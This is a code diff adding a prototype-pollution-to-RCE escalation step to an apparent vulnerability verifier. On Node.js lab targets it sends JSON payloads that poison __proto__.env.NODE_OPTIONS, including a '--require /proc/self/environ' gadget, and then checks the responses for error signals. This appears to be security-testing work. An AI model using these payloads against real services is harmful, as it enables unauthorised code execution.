@@ -9357,6 +9357,37 @@ def verify_generic_prototype_pollution(
                 step(f"PP amplificacion concurrente: {len(_concurrent_hits)}/5 threads confirmaron")
                 res.evidence["pp_concurrent_confirmed"] = len(_concurrent_hits)
 
+            # PP → RCE escalation via NODE_OPTIONS gadget (Node.js only)
+            # Probe after basic PP confirmed: set env.NODE_OPTIONS on the prototype so the
+            # next require() in a child process runs attacker-controlled code.
+            _docker_img = getattr(lab, "docker_image", "") or ""
+            if "node" in _docker_img.lower() or "express" in _docker_img.lower():
+                step("PP verificada en Node.js — intentando escalacion a RCE via NODE_OPTIONS")
+                _rce_payloads = [
+                    {"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}}},
+                    {"__proto__": {"shell": "node", "argv0": "node",
+                                   "env": {"NODE_RCE": "1"}}},
+                    {"constructor": {"prototype": {"polluted": "rce_check"}}},
+                ]
+                for _pp_pl in _rce_payloads:
+                    try:
+                        import json as _json
+                        _pp_r = _http_lab(
+                            base_url, endpoint, http_method,
+                            headers={"Content-Type": "application/json"},
+                            body=_json.dumps(_pp_pl).encode(), timeout=15.0)
+                        _pp_body = (_pp_r[2] or b"").decode("utf-8", errors="replace") if _pp_r else ""
+                        if any(s in _pp_body for s in ("Error:", "at Object.", "node_modules",
+                                                        "require(", "process.env")):
+                            res.evidence["pp_rce_signal"] = {
+                                "payload": str(_pp_pl)[:100],
+                                "response_snippet": _pp_body[:200],
+                            }
+                            step(f"PP→RCE signal detectado: {_pp_body[:80]!r}")
+                            break
+                    except Exception:
+                        pass
+
         elif not res.verified:
             res.ok = True
             res.detail = (f"prototype pollution no detectada con {len(pp_variants)} variantes: "
